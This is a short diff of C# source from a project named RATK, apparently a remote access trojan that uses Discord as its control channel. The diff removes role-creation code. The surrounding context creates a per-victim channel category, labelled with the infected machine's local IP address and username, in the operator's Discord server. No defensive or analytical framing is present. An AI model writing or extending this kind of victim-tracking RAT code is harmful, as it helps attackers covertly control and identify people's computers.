@@ -207,11 +207,6 @@ namespace RATK
                 return;
             }
 
-            var role = guild.Roles.FirstOrDefault(r => r.Name == Settings.RoleName);
-            if (role == null)
-            {
-                await guild.CreateRoleAsync(Settings.RoleName, new GuildPermissions(), null, false);
-            }
 
             var categoryName = $"{LocalIPAddress()} - {Environment.UserName}";
             VictimCTG = guild.CategoryChannels.FirstOrDefault(c => c.Name == categoryName);
